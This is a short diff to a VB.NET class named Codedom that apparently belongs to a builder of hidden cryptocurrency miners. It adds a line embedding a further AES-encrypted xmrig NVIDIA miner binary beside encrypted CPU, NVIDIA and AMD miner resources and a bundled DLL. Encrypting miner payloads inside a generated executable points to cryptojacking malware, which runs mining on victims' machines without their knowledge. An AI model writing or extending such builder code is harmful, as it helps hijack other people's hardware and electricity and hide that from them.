@@ -34,6 +34,7 @@ Public Class Codedom
                 R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
                 R.AddResource(F.Resources_cpu, AES_Encryptor(My.Resources.xmrig))
                 R.AddResource(F.Resources_nvidia, AES_Encryptor(My.Resources.xmrig_nvidia))
+                R.AddResource(F.Resources_nvidia9, AES_Encryptor(My.Resources.xmrig_nvidia9))
                 R.AddResource(F.Resources_amd, AES_Encryptor(My.Resources.xmrig_amd_notls))
                 R.Generate()
             End Using
